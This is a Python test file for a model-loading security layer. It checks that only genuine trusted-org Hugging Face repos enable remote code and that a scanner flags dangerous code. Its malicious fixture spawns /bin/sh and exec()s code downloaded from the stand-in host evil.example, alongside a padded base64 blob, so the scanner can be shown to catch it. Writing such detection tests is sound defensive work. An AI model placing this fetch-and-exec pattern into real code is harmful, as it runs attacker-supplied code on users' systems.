# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved. See /studio/LICENSE.AGPL-3.0

"""Component C: trusted-org auto-enable gating + remote-code consent scanner.

Covers the hardening on the LOAD path:
* ``is_trusted_org_repo`` rejects local-path/spoofed names and fails closed.
* The NemotronH auto-enable in all three workers is gated on it.
* ``scan_remote_code_files`` flags dangerous patterns in repo auto_map code.
"""

from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest

from utils.security.trusted_org import is_trusted_org_repo, clear_cache
from utils.security.remote_code_scan import (
    scan_remote_code_files,
    remote_code_fingerprint,
    CRITICAL,
    HIGH,
)
from utils.security import should_block_remote_code

_BACKEND = Path(__file__).resolve().parent.parent


@pytest.fixture(autouse=True)
def _clean(monkeypatch):
    clear_cache()
    # Force online mode so the Hub-verification branch is exercised.
    monkeypatch.delenv("HF_HUB_OFFLINE", raising=False)
    monkeypatch.delenv("TRANSFORMERS_OFFLINE", raising=False)
    yield
    clear_cache()


def _fake_hfapi(resolved_id, author="unsloth"):
    api = MagicMock()
    api.return_value.model_info.return_value = SimpleNamespace(id=resolved_id, author=author)
    return api


class TestIsTrustedOrgRepo:
    def test_accepts_genuine_unsloth_repo(self):
        with patch("huggingface_hub.HfApi", _fake_hfapi("unsloth/DeepSeek-OCR")):
            assert is_trusted_org_repo("unsloth/DeepSeek-OCR") is True

    def test_accepts_genuine_nvidia_repo(self):
        with patch("huggingface_hub.HfApi", _fake_hfapi("nvidia/Nemotron-H-8B", author="nvidia")):
            assert is_trusted_org_repo("nvidia/Nemotron-H-8B") is True

    def test_rejects_relative_local_path_spoof(self):
        # ./unsloth/evil starts with "unsloth/" after stripping but is a local path.
        assert is_trusted_org_repo("./unsloth/evil") is False

    def test_rejects_absolute_local_path_spoof(self):
        assert is_trusted_org_repo("/tmp/unsloth/evil") is False

    def test_rejects_local_path_even_if_is_local_path_says_so(self):
        # Defensive: a bare "unsloth/x" that resolves as a local dir must fail.
        with patch("utils.security.trusted_org.is_local_path", return_value=True):
            assert is_trusted_org_repo("unsloth/x") is False

    def test_rejects_untrusted_org(self):
        assert is_trusted_org_repo("evil/unsloth-clone") is False

    def test_rejects_bare_name(self):
        assert is_trusted_org_repo("gpt2") is False
        assert is_trusted_org_repo("") is False

    def test_rejects_when_resolved_owner_is_not_trusted(self):
        # Name says unsloth/ but the Hub resolves it elsewhere -> fail closed.
        with patch("huggingface_hub.HfApi", _fake_hfapi("someoneelse/x", author="someoneelse")):
            assert is_trusted_org_repo("unsloth/x") is False

    def test_fails_closed_when_hub_raises(self):
        api = MagicMock()
        api.return_value.model_info.side_effect = RuntimeError("network down")
        with patch("huggingface_hub.HfApi", api):
            assert is_trusted_org_repo("unsloth/maybe-real") is False

    def test_offline_trusts_shape_without_hub(self, monkeypatch):
        monkeypatch.setenv("HF_HUB_OFFLINE", "1")
        clear_cache()
        # No HfApi mock: must not even try the Hub when offline.
        assert is_trusted_org_repo("unsloth/Local-Cached") is True
        assert is_trusted_org_repo("evil/x") is False


class TestNemotronGateUsesTrustCheck:
    """The auto-enable in all three workers must be gated on is_trusted_org_repo."""

    @pytest.mark.parametrize(
        "rel",
        [
            "core/training/worker.py",
            "core/inference/worker.py",
            "core/export/worker.py",
        ],
    )
    def test_worker_nemotron_block_calls_trust_check(self, rel):
        src = (_BACKEND / rel).read_text()
        assert "_NEMOTRON_TRUST_SUBSTRINGS" in src
        # The trust check must appear and be wired into the auto-enable guard.
        assert "is_trusted_org_repo(" in src

    def test_gate_logic_blocks_spoof_allows_trusted(self):
        # Mirror the worker predicate to prove is_trusted_org_repo is decisive.
        substrings = ("nemotron_h", "nemotron-h", "nemotron-3-nano")

        def gate(name, trusted):
            low = name.lower()
            return (
                any(s in low for s in substrings)
                and (low.startswith("unsloth/") or low.startswith("nvidia/"))
                and trusted
            )

        assert gate("unsloth/Nemotron-H-8B", trusted=True) is True
        assert gate("unsloth/Nemotron-H-8B", trusted=False) is False  # spoof rejected
        assert gate("unsloth/llama-3-8b", trusted=True) is False       # not nemotron


_MALICIOUS = (
    "import subprocess, urllib.request, base64\n"
    "subprocess.Popen(['/bin/sh', '-c', 'id'])\n"
    "exec(urllib.request.urlopen('http://evil.example/x').read())\n"
    "BLOB = '" + ("QWxhZGRpbjpvcGVuc2VzYW1l" * 20) + "'\n"
)

_BENIGN = (
    "import torch\nimport torch.nn as nn\n"
    "from transformers import PreTrainedModel\n"
    "class DeepseekOCRForCausalLM(PreTrainedModel):\n"
    "    def forward(self, x):\n        return self.proj(x)\n"
)


class TestRemoteCodeScan:
    def test_flags_malicious(self):
        res = scan_remote_code_files({"modeling_evil.py": _MALICIOUS})
        assert not res.clean
        assert res.max_severity in (CRITICAL, HIGH)
        # Check names come from the canonical scanner (scripts/scan_packages.py);
        # assert behaviour (flagged + blocked), not the exact vendored names.
        assert res.findings
        assert should_block_remote_code(res) is True

    def test_benign_is_clean(self):
        res = scan_remote_code_files({"modeling_ok.py": _BENIGN})
        assert res.clean, res.summary()
        assert should_block_remote_code(res) is False

    def test_non_py_ignored(self):
        res = scan_remote_code_files({"README.md": _MALICIOUS})
        assert res.clean

    def test_fingerprint_stable_and_sensitive(self):
        a = remote_code_fingerprint({"m.py": _BENIGN})
        b = remote_code_fingerprint({"m.py": _BENIGN})
        c = remote_code_fingerprint({"m.py": _BENIGN + "\n# changed"})
        assert a == b
        assert a != c
